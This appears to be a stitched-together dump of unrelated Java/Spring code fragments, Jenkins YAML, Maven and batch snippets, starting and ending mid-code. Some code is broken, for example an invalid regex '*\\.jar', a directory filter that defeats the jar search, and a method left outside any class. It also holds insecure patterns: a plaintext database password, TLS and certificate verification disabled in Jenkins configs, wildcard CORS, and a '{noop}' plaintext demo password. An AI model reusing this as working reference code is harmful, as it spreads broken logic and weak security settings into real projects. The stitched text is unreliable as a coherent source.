		throw new IllegalArgumentException("Could not detect Platform: os.name=" + osName);
	}

	public boolean isUnixLike() {
		return this != Windows;
	}
}
-----------------------------------------------------------------------------------------
import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

@Retention(RetentionPolicy.RUNTIME)  
@Target({ElementType.METHOD,ElementType.CONSTRUCTOR})  
public @interface AnnotationVO {
	 public String methodName();  
	 public String description();  
}
-----------------------------------------------------------------------------------------
db.driver=org.mariadb.jdbc.Driver
db.url=jdbc:mariadb://localhost/javaee
db.username=javaee
db.password=deNUfh27t
-----------------------------------------------------------------------------------------
import java.sql.ResultSet;
import java.sql.SQLException;
import bean.Aanilevy;
import org.springframework.jdbc.core.RowMapper;

public class AanilevyRowMapper implements RowMapper <Aanilevy> {
	
	
	
public Aanilevy mapRow(ResultSet rs, int rownumber)	throws SQLException{
	
	Aanilevy aanilevy=new Aanilevy();
	
	
	aanilevy.setId(rs.getInt("id"));
	
	aanilevy.setNimi(rs.getString("nimi"));
	
	aanilevy.setTekija(rs.getString("tekija"));
	
	
	return aanilevy;
}
}

https://github.com/btuduri/jarmasm/tree/master/armasm/src/asm/instructions
-----------------------------------------------------------------------------------------
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.function.Predicate;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

import com.beust.jcommander.JCommander;
import com.beust.jcommander.Parameter;

/**
 * Mainclass holds main method
 *
 * @author sven
 *
 */
public class Main {
	/**
	 * Path to the manifest file
	 */
	@Parameter(names = { "--manifest", "-m" }, required = false)
	File manifestPath;
	/**
	 * Path to where the new created maven archive gets installed
	 */
	@Parameter(names = { "--install", "-i" }, required = true)
	File installPath;
	/**
	 * Path to the jars that the file depends on
	 */
	@Parameter(names = { "--libs", "-l" }, required = false)
	File libDir;
	/**
	 * Griupid of the jar to be installed
	 */
	@Parameter(names = { "--groupid", "-g" }, required = true)
	String groupId;
	/**
	 * Artifactid of the jar
	 */
	@Parameter(names = { "--artifactid", "-a" }, required = true)
	String artifactId;
	/**
	 * Version of the jar
	 */
	@Parameter(names = { "--version", "-v" }, required = true)
	String version;
	/**
	 * Holds the xml of the pom
	 */
	private final StringBuilder builder = new StringBuilder();
	/**
	 * Pattern to validate jarfiles
	 */
	private static final Predicate<String> jarPattern = Pattern.compile("*\\.jar").asPredicate();
	/**
	 * Contains all jarFiles that the files depends directly or indirectly
	 */
	private List<Path> jarFiles;

	public static void main(final String[] args) throws JarMavenPackagerArgumentsException {
		final Main main = new Main();
		JCommander.newBuilder().addObject(main).build().parse(args);
		main.searchForJars();

	}

	/**
	 * Searches for dependencies in the manifestclasspath or the libdir provided
	 *
	 * @throws JarMavenPackagerArgumentsException
	 */
	void searchForJars() throws JarMavenPackagerArgumentsException {
		if ((this.libDir == null) && (this.manifestPath == null)) {
			throw new JarMavenPackagerArgumentsException("Provide at least on of manifestfilepaht or libdir");
		}
		if (this.libDir != null) {
			try {
				this.jarFiles = Files.walk(this.libDir.toPath()).filter(Files::isDirectory).filter(Files::exists)
						.filter(path -> Main.jarPattern.test(path.getFileName().toString()))
						.collect(Collectors.toUnmodifiableList());
			} catch (final IOException e) {
				throw new JarMavenPackagerArgumentsException("failure trying to read the libdir", e);
			}
		} else {
			// Parse the manifest file
			// TODO implement this shit !!!. But maybe not this is too incosistent

		}
	}
}

	public static Optional<String> getSha1FromFile(final File file) throws NoSuchAlgorithmException {
		final MessageDigest digest = MessageDigest.getInstance("SHA1");
		try (FileInputStream inputStream = new FileInputStream(file)) {
			final byte[] dataBytes = new byte[1024];
			int nRead = 0;
			while ((nRead = inputStream.read(dataBytes)) != -1) {
				digest.update(dataBytes, 0, nRead);
			}
			final byte[] mdbytes = digest.digest();
			final StringBuilder builder = new StringBuilder();
			for (final byte mdbyte : mdbytes) {
				builder.append(Integer.toString((mdbyte & 0xff) + 0x100, 16).substring(1));
			}
			return Optional.of(builder.toString());
		} catch (final FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (final IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return Optional.empty();
	}
-----------------------------------------------------------------------------------------
package com.paragon.mailingcontour.commons.rest.configuration;

import ch.qos.logback.classic.AsyncAppender;
import ch.qos.logback.classic.Level;
import ch.qos.logback.classic.LoggerContext;
import ch.qos.logback.classic.spi.LoggerContextListener;
import ch.qos.logback.core.spi.ContextAwareBase;
import net.logstash.logback.appender.LogstashSocketAppender;
import net.logstash.logback.stacktrace.ShortenedThrowableConverter;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Configuration;

@Configuration
public class LoggingConfiguration {

    private final Logger log = LoggerFactory.getLogger(LoggingConfiguration.class);

    private LoggerContext context = (LoggerContext) LoggerFactory.getILoggerFactory();

    private final String appName;

    private final String serverPort;

    private final String instanceId;

    private final JHipsterProperties jHipsterProperties;

    public LoggingConfiguration(@Value("${spring.application.name}") String appName, @Value("${server.port}") String serverPort,
                                @Value("${eureka.instance.instanceId}") String instanceId, JHipsterProperties jHipsterProperties) {
        this.appName = appName;
        this.serverPort = serverPort;
        this.instanceId = instanceId;
        this.jHipsterProperties = jHipsterProperties;
        if (jHipsterProperties.getLogging().getLogstash().isEnabled()) {
            addLogstashAppender(context);

            // Add context listener
            LogbackLoggerContextListener loggerContextListener = new LogbackLoggerContextListener();
            loggerContextListener.setContext(context);
            context.addListener(loggerContextListener);
        }
    }

    public void addLogstashAppender(LoggerContext context) {
        log.info("Initializing Logstash logging");

        LogstashSocketAppender logstashAppender = new LogstashSocketAppender();
        logstashAppender.setName("LOGSTASH");
        logstashAppender.setContext(context);
        String customFields = "{\"app_name\":\"" + appName + "\",\"app_port\":\"" + serverPort + "\"," +
            "\"instance_id\":\"" + instanceId + "\"}";

        // Set the Logstash appender config from JHipster properties
        logstashAppender.setSyslogHost(jHipsterProperties.getLogging().getLogstash().getHost());
        logstashAppender.setPort(jHipsterProperties.getLogging().getLogstash().getPort());
        logstashAppender.setCustomFields(customFields);

        // Limit the maximum length of the forwarded stacktrace so that it won't exceed the 8KB UDP limit of logstash
        ShortenedThrowableConverter throwableConverter = new ShortenedThrowableConverter();
        throwableConverter.setMaxLength(7500);
        throwableConverter.setRootCauseFirst(true);
        logstashAppender.setThrowableConverter(throwableConverter);

        logstashAppender.start();

        // Wrap the appender in an Async appender for performance
        final AsyncAppender asyncLogstashAppender = new AsyncAppender();
        asyncLogstashAppender.setContext(context);
        asyncLogstashAppender.setName("ASYNC_LOGSTASH");
        asyncLogstashAppender.setQueueSize(jHipsterProperties.getLogging().getLogstash().getQueueSize());
        asyncLogstashAppender.addAppender(logstashAppender);
        asyncLogstashAppender.start();

        context.getLogger("ROOT").addAppender(asyncLogstashAppender);
    }

    /**
     * Logback configuration is achieved by configuration file and API.
     * When configuration file change is detected, the configuration is reset.
     * This listener ensures that the programmatic configuration is also re-applied after reset.
     */
    class LogbackLoggerContextListener extends ContextAwareBase implements LoggerContextListener {

        @Override
        public boolean isResetResistant() {
            return true;
        }

        @Override
        public void onStart(LoggerContext context) {
            addLogstashAppender(context);
        }

        @Override
        public void onReset(LoggerContext context) {
            addLogstashAppender(context);
        }

        @Override
        public void onStop(LoggerContext context) {
            // Nothing to do.
        }

        @Override
        public void onLevelChange(ch.qos.logback.classic.Logger logger, Level level) {
            // Nothing to do.
        }
    }
}
-----------------------------------------------------------------------------------------
import io.github.jhipster.config.JHipsterConstants;

import org.aspectj.lang.JoinPoint;
import org.aspectj.lang.ProceedingJoinPoint;
import org.aspectj.lang.annotation.AfterThrowing;
import org.aspectj.lang.annotation.Around;
import org.aspectj.lang.annotation.Aspect;
import org.aspectj.lang.annotation.Pointcut;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.core.env.Environment;

import java.util.Arrays;

/**
 * Aspect for logging execution of service and repository Spring components.
 *
 * By default, it only runs with the "dev" profile.
 */
@Aspect
public class LoggingAspect {

    private final Logger log = LoggerFactory.getLogger(this.getClass());

    private final Environment env;

    public LoggingAspect(Environment env) {
        this.env = env;
    }

    /**
     * Pointcut that matches all repositories, services and Web REST endpoints.
     */
    @Pointcut("within(io.github.jhipster.registry.repository..*) || within(io.github.jhipster.registry.service..*) || within(io.github.jhipster.registry.web.rest..*)")
    public void loggingPointcut() {
        // Method is empty as this is just a Pointcut, the implementations are in the advices.
    }

    /**
     * Advice that logs methods throwing exceptions.
     *
     * @param joinPoint join point for advice
     * @param e exception
     */
    @AfterThrowing(pointcut = "loggingPointcut()", throwing = "e")
    public void logAfterThrowing(JoinPoint joinPoint, Throwable e) {
        if (env.acceptsProfiles(JHipsterConstants.SPRING_PROFILE_DEVELOPMENT)) {
            log.error("Exception in {}.{}() with cause = \'{}\' and exception = \'{}\'", joinPoint.getSignature().getDeclaringTypeName(),
                joinPoint.getSignature().getName(), e.getCause() != null? e.getCause() : "NULL", e.getMessage(), e);

        } else {
            log.error("Exception in {}.{}() with cause = {}", joinPoint.getSignature().getDeclaringTypeName(),
                joinPoint.getSignature().getName(), e.getCause() != null? e.getCause() : "NULL");
        }
    }

    /**
     * Advice that logs when a method is entered and exited.
     *
     * @param joinPoint join point for advice
     * @return result
     * @throws Throwable throws IllegalArgumentException
     */
    @Around("loggingPointcut()")
    public Object logAround(ProceedingJoinPoint joinPoint) throws Throwable {
        if (log.isDebugEnabled()) {
            log.debug("Enter: {}.{}() with argument[s] = {}", joinPoint.getSignature().getDeclaringTypeName(),
                joinPoint.getSignature().getName(), Arrays.toString(joinPoint.getArgs()));
        }
        try {
            Object result = joinPoint.proceed();
            if (log.isDebugEnabled()) {
                log.debug("Exit: {}.{}() with result = {}", joinPoint.getSignature().getDeclaringTypeName(),
                    joinPoint.getSignature().getName(), result);
            }
            return result;
        } catch (IllegalArgumentException e) {
            log.error("Illegal argument: {} in {}.{}()", Arrays.toString(joinPoint.getArgs()),
                    joinPoint.getSignature().getDeclaringTypeName(), joinPoint.getSignature().getName());

            throw e;
        }
    }
}
-----------------------------------------------------------------------------------------
    @Bean
    public MongoDbFactory mongoFactory() {
        return connectionFactory().mongoDbFactory();
    }
-----------------------------------------------------------------------------------------
import org.jhipster.blog.domain.Entry;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.Pageable;
import org.springframework.stereotype.Repository;

import org.springframework.data.jpa.repository.*;
import org.springframework.data.repository.query.Param;
import java.util.List;

/**
 * Spring Data JPA repository for the Entry entity.
 */
@SuppressWarnings("unused")
@Repository
public interface EntryRepository extends JpaRepository<Entry,Long> {

    @Query("select distinct entry from Entry entry left join fetch entry.tags")
    List<Entry> findAllWithEagerRelationships();

    @Query("select entry from Entry entry left join fetch entry.tags where entry.id =:id")
    Entry findOneWithEagerRelationships(@Param("id") Long id);

    Page<Entry> findByBlogUserLoginOrderByDateDesc(String currentUserLogin, Pageable pageable);
}
-----------------------------------------------------------------------------------------
    @Bean
    public SpringLiquibase liquibase(@Qualifier("taskExecutor") TaskExecutor taskExecutor,
            DataSource dataSource, LiquibaseProperties liquibaseProperties) {

        // Use liquibase.integration.spring.SpringLiquibase if you don't want Liquibase to start asynchronously
        SpringLiquibase liquibase = new AsyncSpringLiquibase(taskExecutor, env);
        liquibase.setDataSource(dataSource);
        liquibase.setChangeLog("classpath:config/liquibase/master.xml");
        liquibase.setContexts(liquibaseProperties.getContexts());
        liquibase.setDefaultSchema(liquibaseProperties.getDefaultSchema());
        liquibase.setDropFirst(liquibaseProperties.isDropFirst());
        if (env.acceptsProfiles(JHipsterConstants.SPRING_PROFILE_NO_LIQUIBASE)) {
            liquibase.setShouldRun(false);
        } else {
            liquibase.setShouldRun(liquibaseProperties.isEnabled());
            log.debug("Configuring Liquibase");
        }
        return liquibase;
    }
-----------------------------------------------------------------------------------------
@Configuration
public class BeanRegister {
    @Bean
    @Primary
    @ConfigurationProperties(prefix = "spring.datasource")
    public DataSource dataSource() {
        DataSource primary = DataSourceBuilder.create().build();
        return primary;
    }

    @Bean(name = "readDataSource")
    @ConfigurationProperties(prefix = "spring.datasource.read")
    public DataSource readDataSource() {
        DataSource read = DataSourceBuilder.create().build();
        return read;
    }

    @Bean(name = "objectMapper")
    @Primary
    public ObjectMapper objectMapper() {
        ObjectMapper mp = new ObjectMapper();
        mp.setDateFormat(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss"));
        return mp;
    }
}
-----------------------------------------------------------------------------------------
kubectl apply -f service-account.yml
kubectl apply -f config.yml
kubectl apply -f jenkins.yml
jenkins:
  location:
    url: http://jenkins/
  clouds:
    - kubernetes:
        name: "advanced-k8s-config"
        serverUrl: "https://avanced-k8s-config:443"
        skipTlsVerify: true
        namespace: "default"
        credentialsId: "advanced-k8s-credentials"
        jenkinsUrl: "http://jenkins/"
        connectTimeout: 0
        readTimeout: 0
        containerCapStr: 100
        maxRequestsPerHostStr: 64
        retentionTimeout: 5
        templates:
          - name: "k8s-slave"
            namespace: "default"
            label: "linux-x86_64"
            nodeUsageMode: EXCLUSIVE
            containers:
              - name: "jnlp"
                image: "jenkinsci/jnlp-slave:latest"
                alwaysPullImage: true
                workingDir: "/home/jenkins"
                ttyEnabled: true
                resourceRequestCpu: "500m"
                resourceLimitCpu: "1000m"
                resourceRequestMemory: "1Gi"
                resourceLimitMemory: "2Gi"
            volumes:
              - emptyDirVolume:
                  memory: false
                  mountPath: "/tmp"
            idleMinutes: "1"
            activeDeadlineSeconds: "120"
            slaveConnectTimeout: "1000"
-----------------------------------------------------------------------------------------
credentials:
  system:
    domainCredentials:
      - credentials:
          - gitLabApiTokenImpl:
              scope: SYSTEM
              id: gitlab_token
              apiToken: "${BIND_TOKEN}"
              description: "Gitlab Token"
unclassified:
  gitlabconnectionconfig:
    connections:
      - apiTokenId: gitlab_token
        clientBuilderId: "autodetect"
        connectionTimeout: 20
        ignoreCertificateErrors: true
        name: "my_gitlab_server"
        readTimeout: 10
        url: "https://gitlab.com/"
-----------------------------------------------------------------------------------------
given()
  .when()
  .get(getBaseUrl() + "/default/users/Michael")
  .then()
  .header("Cache-Control", "no-cache, no-store, max-age=0, must-revalidate")
  .header("Pragma", "no-cache");
-----------------------------------------------------------------------------------------
import org.mockserver.mock.action.ExpectationCallback;
import org.mockserver.model.HttpRequest;
import org.mockserver.model.HttpResponse;

import static org.mockserver.model.HttpResponse.notFoundResponse;
import static org.mockserver.model.HttpResponse.response;


public class ExpectationCallbackHandler implements ExpectationCallback {

    public HttpResponse handle(HttpRequest httpRequest) {
        if (httpRequest.getPath().getValue().endsWith("/callback")) {
            return httpResponse;
        } else {
            return notFoundResponse();
        }
    }

    public static HttpResponse httpResponse = response()
            .withStatusCode(200);
}
-----------------------------------------------------------------------------------------
import java.time.LocalDateTime;
import java.util.Collection;

import org.springframework.security.access.AccessDecisionVoter;
import org.springframework.security.access.ConfigAttribute;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.GrantedAuthority;

public class MinuteBasedVoter implements AccessDecisionVoter {
    @Override
    public boolean supports(ConfigAttribute attribute) {
        return true;
    }

    @Override
    public boolean supports(Class clazz) {
        return true;
    }

    @Override
    public int vote(Authentication authentication, Object object, Collection collection) {
        return authentication.getAuthorities().stream().map(GrantedAuthority::getAuthority).filter(r -> "ROLE_USER".equals(r) && LocalDateTime.now().getMinute() % 2 != 0).findAny().map(s -> ACCESS_DENIED).orElseGet(() -> ACCESS_ABSTAIN);
    }
}
-----------------------------------------------------------------------------------------
    @Bean
    public AccessDecisionManager accessDecisionManager() {
        // @formatter: off
        List<AccessDecisionVoter<? extends Object>> decisionVoters = Arrays.asList(new WebExpressionVoter(), new RoleVoter(), new AuthenticatedVoter(), new MinuteBasedVoter());
        // @formatter: on
        return new UnanimousBased(decisionVoters);
    }
-----------------------------------------------------------------------------------------
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
import org.springframework.security.core.userdetails.User;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.DelegatingPasswordEncoder;
import org.springframework.security.crypto.password.NoOpPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.security.crypto.password.StandardPasswordEncoder;
import org.springframework.security.crypto.scrypt.SCryptPasswordEncoder;
import org.springframework.security.provisioning.InMemoryUserDetailsManager;

import java.util.Collections;
import java.util.HashMap;
import java.util.Map;

@Configuration
public class PasswordStorageWebSecurityConfigurer extends WebSecurityConfigurerAdapter {

    @Override
    protected void configure(AuthenticationManagerBuilder auth) throws Exception {
        auth.eraseCredentials(false) // 4
          .userDetailsService(getUserDefaultDetailsService())
          .passwordEncoder(passwordEncoder());
    }

    @Bean
    public UserDetailsService getUserDefaultDetailsService() {
        return new InMemoryUserDetailsManager(User
          .withUsername("baeldung")
          .password("{noop}SpringSecurity5")
          .authorities(Collections.emptyList())
          .build());
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        // set up the list of supported encoders and their prefixes
        PasswordEncoder defaultEncoder = new StandardPasswordEncoder();
        Map<String, PasswordEncoder> encoders = new HashMap<>();
        encoders.put("bcrypt", new BCryptPasswordEncoder());
        encoders.put("scrypt", new SCryptPasswordEncoder());
        encoders.put("noop", NoOpPasswordEncoder.getInstance());

        DelegatingPasswordEncoder passwordEncoder = new DelegatingPasswordEncoder("bcrypt", encoders);
        passwordEncoder.setDefaultPasswordEncoderForMatches(defaultEncoder);

        return passwordEncoder;
    }

}
-----------------------------------------------------------------------------------------
	public static Color getColor (int val) {
		// 255で割ると色が１段階分減っちゃうけど、256にするなら複雑なロジック必要になりそうだから後回し
		double red = ((val & 0xff0000) >> 16) / 255.0d;
		double green = ((val & 0xff00) >> 8) / 255.0d;
		double blue = (val & 0xff) / 255.0d;
		double opacity = (((val & 0xff000000) >> 24) & 0xff) / 255.0d;
		return new Color(red, green, blue, opacity);
	}
-----------------------------------------------------------------------------------------

import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletResponse;

import org.springframework.stereotype.Component;

@Component
public class SimpleCORSFilter implements Filter {

	public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException {
		HttpServletResponse response = (HttpServletResponse) res;
		response.setHeader("Access-Control-Allow-Origin", "*");
		response.setHeader("Access-Control-Allow-Methods", "POST, GET, OPTIONS, DELETE");
		response.setHeader("Access-Control-Max-Age", "3600");
		response.setHeader("Access-Control-Allow-Headers", "x-requested-with");
		chain.doFilter(req, res);
	}

	public void init(FilterConfig filterConfig) {}

	public void destroy() {}
}
-----------------------------------------------------------------------------------------
import org.junit.runner.RunWith;

import cucumber.api.CucumberOptions;
import cucumber.api.junit.Cucumber;

@RunWith(Cucumber.class)
@CucumberOptions(features = "src/test/resources")
public class RunCukesTest {
}
-----------------------------------------------------------------------------------------
import java.io.IOException;
import java.net.Socket;

public class FreePortFinder {

    public static int find() {
        for (int p = 8080; p < 9000; p++) {
            if (isPortAvailable(p)) {
                return p;
            }
        }
        throw new RuntimeException("unable to find any available ports");
    }

    private static boolean isPortAvailable(int port) {
        Socket s = null;
        try {
            s = new Socket("localhost", port);
            return false;
        } catch (IOException e) {
            return true;
        } finally {
            if (s != null) {
                try {
                    s.close();
                } catch (IOException e) {
                    throw new RuntimeException("Unable to close socket to port " + port, e);
                }
            }
        }
    }
}
@Entity
@Table(name = "locations")
@SequenceGenerator(name = "location_id_generator", allocationSize = 1, initialValue = 10)
public class Location {
}
-----------------------------------------------------------------------------------------
import java.util.Date;
import java.util.TimeZone;

import org.springframework.stereotype.Component;

@Component
public class DateFactory {

    public static final TimeZone DEFAULT_TIME_ZONE = TimeZone.getTimeZone("UTC");

    public Date now() {
        return new Date();
    }

    public TimeZone timeZone() {
        return DEFAULT_TIME_ZONE;
    }
}
-----------------------------------------------------------------------------------------
import javax.sql.DataSource;

import org.springframework.cloud.Cloud;
import org.springframework.cloud.CloudFactory;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Profile;

@Configuration
@Profile(SaganProfiles.CLOUDFOUNDRY)
class CloudFoundryDatabaseConfig {

    @Bean
    public Cloud cloud() {
        return new CloudFactory().getCloud();
    }

    @Bean
    public DataSource dataSource() {
        DataSource dataSource = cloud().getServiceConnector("sagan-db", DataSource.class, null);
        return dataSource;
    }
}
-----------------------------------------------------------------------------------------
import io.spring.initializr.generator.buildsystem.Build;

import org.springframework.core.Ordered;

/**
 * Callback for customizing a project's {@link Build}. Invoked with an {@link Ordered
 * order} of {@code 0} by default, considering overriding {@link #getOrder()} to customize
 * this behaviour.
 *
 * @param <B> {@link Build} type handled by this customizer
 * @author Andy Wilkinson
 */
@FunctionalInterface
public interface BuildCustomizer<B extends Build> extends Ordered {

	void customize(B build);

	@Override
	default int getOrder() {
		return 0;
	}

}
-----------------------------------------------------------------------------------------
	@Bean
	@ConditionalOnMissingBean(name = "statsRetryTemplate")
	RetryTemplate statsRetryTemplate() {
		RetryTemplate retryTemplate = new RetryTemplate();
		ExponentialBackOffPolicy backOffPolicy = new ExponentialBackOffPolicy();
		backOffPolicy.setInitialInterval(3000L);
		backOffPolicy.setMultiplier(3);
		SimpleRetryPolicy retryPolicy = new SimpleRetryPolicy(this.statsProperties.getElastic().getMaxAttempts(),
				Collections.singletonMap(Exception.class, true));
		retryTemplate.setBackOffPolicy(backOffPolicy);
		retryTemplate.setRetryPolicy(retryPolicy);
		return retryTemplate;
	}
-----------------------------------------------------------------------------------------
    public static void main(String[] args) {
        SpringApplication.run(Application.class, args);
    }

    @Bean
    public CommandLineRunner commandLineRunner(ApplicationContext ctx) {
        return args -> {

            System.out.println("Let's inspect the beans provided by Spring Boot:");

            String[] beanNames = ctx.getBeanDefinitionNames();
            Arrays.sort(beanNames);
            for (String beanName : beanNames) {
                System.out.println(beanName);
            }

        };
    }
-----------------------------------------------------------------------------------------
appsody list
appsody repo add incubator https://raw.githubusercontent.com/seabaylea/stacks/javametrics-dev/index.yaml
appsody run
appsody stop
minikube service appsody-spring

            <!-- Plugin to run unit tests -->
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-surefire-plugin</artifactId>
                <version>${version.maven-surefire-plugin}</version>
                <executions>
                    <execution>
                        <phase>test</phase>
                        <id>default-test</id>
                        <configuration>
                            <excludes>
                                <exclude>**/it/**</exclude>
                            </excludes>
                            <reportsDirectory>
                                ${project.build.directory}/test-reports/unit
                            </reportsDirectory>
                        </configuration>
                    </execution>
                </executions>
                <configuration>
                    <skipTests>${skipTests}</skipTests>
                </configuration>
            </plugin>
            <!-- Plugin to run functional tests -->
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-failsafe-plugin</artifactId>
                <version>${version.maven-failsafe-plugin}</version>
                <executions>
                    <execution>
                        <phase>integration-test</phase>
                        <id>integration-test</id>
                        <goals>
                            <goal>integration-test</goal>
                        </goals>
                        <configuration>
                            <includes>
                                <include>**/it/**</include>
                            </includes>
                            <systemPropertyVariables>
                                <liberty.test.port>${http.port}</liberty.test.port>
                                <war.name>${app.name}</war.name>
                            </systemPropertyVariables>
                        </configuration>
                    </execution>
                    <execution>
                        <id>verify-results</id>
                        <goals>
                            <goal>verify</goal>
                        </goals>
                    </execution>
                </executions>
                <configuration>
                    <summaryFile>
                        ${project.build.directory}/test-reports/it/failsafe-summary.xml
                    </summaryFile>
                    <reportsDirectory>
                        ${project.build.directory}/test-reports/it
                    </reportsDirectory>
                </configuration>
            </plugin>
-----------------------------------------------------------------------------------------
@echo Checking prerequisites...
@echo off

docker ps >nul 2>nul
IF %ERRORLEVEL% NEQ 0 ECHO [Warning] Docker not running or not installed 
@echo Adding %~dp0 to your Path environment variable if not already present....
@echo off

setx APPSODY_PATH "%~dp0
set APPSODY_PATH=%~dp0
set lastPathChar=%PATH:~-1%
if NOT "%lastPathChar%" == ";" set "PATH=%PATH%;"

for /F "skip=2 tokens=1,2*" %%N in ('%SystemRoot%\System32\reg.exe query "HKCU\Environment" /v "Path" 2^>nul') do if /I "%%N" == "Path" set "UserPath=%%P"
IF DEFINED UserPath goto UserPathRead
REM If no user path env var is set, we just set it to %APPSODY_PATH%
setx PATH "%%APPSODY_PATH%%

goto :SkipSetx

:UserPathRead
REM If the user path env var is already populated, add %APPSODY_PATH%, unless it is there already
SET UserPathTest=%UserPath:APPSODY_PATH=NONE%
REM echo UserPathTest = %UserPathTest%
REM echo UserPath = %UserPath%
if NOT "%UserPathTest%" == "%UserPath%" goto SkipSetx

set lastUserPathChar=%UserPath:~-1%
if NOT "%lastUserPathChar%" == ";" set "UserPath=%UserPath%;"
setx PATH "%UserPath%%%APPSODY_PATH%%
:SkipSetx
REM Append the value of %APPSODY_PATH% to the PATH env var, unless it's already there
CALL SET TestPath=%%PATH:%APPSODY_PATH%=NONE%%
REM echo TestPath = %TestPath%
REM echo PATH = %PATH%
if NOT "%TestPath%" == "%PATH%" goto :done
set PATH=%PATH%%APPSODY_PATH%
:done

@echo Done - enjoy appsody!
-----------------------------------------------------------------------------------------
java --enable-preview -jar java-13-preview.jar [SOME STRING]
-----------------------------------------------------------------------------------------
import org.junit.jupiter.api.extension.ExtensionContext;
import org.springframework.test.context.junit.jupiter.SpringExtension;
import org.testcontainers.containers.GenericContainer;

public class SpringTestContainersExtension extends SpringExtension {

	private GenericContainer<?> container;
	private boolean restartContainerForEveryTest = false;

	public SpringTestContainersExtension(GenericContainer<?> container) {
		this.container = container;
	}

	public SpringTestContainersExtension(GenericContainer<?> container, boolean restartContainerForEveryTest) {
		this.container = container;
		this.restartContainerForEveryTest = restartContainerForEveryTest;
	}

	@Override
	public void afterAll(ExtensionContext context) throws Exception {
		if (container.isRunning()) {
			container.stop();
		}
		super.afterAll(context);
	}

	@Override
	public void postProcessTestInstance(Object testInstance, ExtensionContext context) throws Exception {
		if (!container.isRunning()) {
			container.start();
		}
		super.postProcessTestInstance(testInstance, context);
	}

	@Override
	public void afterEach(ExtensionContext context) throws Exception {
		if (restartContainerForEveryTest) {
			container.stop();
		}
		super.afterEach(context);
	}

}
-----------------------------------------------------------------------------------------
import org.junit.jupiter.api.extension.ConditionEvaluationResult;
import org.junit.jupiter.api.extension.ExecutionCondition;
import org.junit.jupiter.api.extension.ExtensionContext;

public class DisableOnMacCondition implements ExecutionCondition {

	@Override
	public ConditionEvaluationResult evaluateExecutionCondition(ExtensionContext context) {
		String osName = System.getProperty("os.name");
		if (osName.equalsIgnoreCase("Mac OS X")) {
			return ConditionEvaluationResult.disabled("Test disabled on mac");
		} else {
			return ConditionEvaluationResult.enabled("Test enabled");
		}
	}

}
-----------------------------------------------------------------------------------------
import java.io.FileOutputStream;
import java.io.PrintWriter;

/**
 * Created by IntelliJ IDEA.
 * User: tobe
 * Date: 2005-jan-05
 * Time: 09:21:10
 * To change this template use File | Settings | File Templates.
 */
public class GenerateBigFile {
    public static void main(String[] args) {
        if (args.length < 1) {
            System.out.println("Usage:");
            System.out.println("GenerateBigFile output-file");
            System.exit(1);
        }
        PrintWriter out = null;
        try {
            out = new PrintWriter(new FileOutputStream(args[0]));
            out.println("<html xmlns=\"http://www.w3.org/1999/xhtml\"><head><title>Big test file</title></head><body>");
            for (int i = 0; i < 10000; i++) {
                //style: 10pt Times #000000;
                String[] styles = {"10pt", "12pt", "14pt", "18pt", "24pt"};
                String[] fonts = {"Times", "Helvetica", "Courier"};
                String style = styles[(int) Math.floor(Math.random() * styles.length)];
                String font = fonts[(int) Math.floor(Math.random() * fonts.length)];
                String colour = Integer.toHexString((int) Math.floor(Math.random() * 256)) + Integer.toHexString((int) Math.floor(Math.random() * 256)) + Integer.toHexString((int) Math.floor(Math.random() * 256));
                out.println("<p style=\"font: " + style + " " + font + "; color: #" + colour + "\">Some Styled text to see how we can handle it</p>");
            }
            out.println("</body></html>");
        } catch (Exception e) {//I know, never do this :-)
            e.printStackTrace();
        } finally {
            out.close();
        }
    }
}
-----------------------------------------------------------------------------------------
import java.io.PrintWriter;
import java.io.StringWriter;
import java.util.logging.Formatter;
import java.util.logging.LogRecord;

/**
 * A variant of the default Java logging SimpleFormatter, not being so messy
 * @author rkrell
 */
public class LogFormatter extends Formatter
{
    private final String lineSeparator = System.getProperty("line.separator");

    /**
     * Format the given LogRecord.
     *
     * @param record the log record to be formatted.
     * @return a formatted log record
     */
    @Override
    public synchronized String format(LogRecord record)
    {
        StringBuilder sb = new StringBuilder();
        if (Debug.isDEBUG())
        {
            if (record.getSourceClassName() != null)
            {
                sb.append(record.getSourceClassName());
            }
            else
            {
                sb.append(record.getLoggerName());
            }
            if (record.getSourceMethodName() != null)
            {
                sb.append(" ");
                sb.append(record.getSourceMethodName());
            }

            sb.append(lineSeparator);
            sb.append(record.getLevel().getLocalizedName());
            sb.append(": ");
        }

        // Append log message
        String message = formatMessage(record);
        sb.append(message);

        // Append stacktrace
        if (Debug.isSTACKTRACE() && (record.getThrown() != null))
        {
            sb.append(lineSeparator);
            try
            {
                StringWriter sw = new StringWriter();
                PrintWriter pw = new PrintWriter(sw);
                record.getThrown().printStackTrace(pw);
                pw.close();
                sb.append(sw.toString());
            }
            catch (Exception ignored) {}
        }

        sb.append(lineSeparator);

        return sb.toString();
    }
}
-----------------------------------------------------------------------------------------
import java.util.List;
import java.util.concurrent.CountDownLatch;

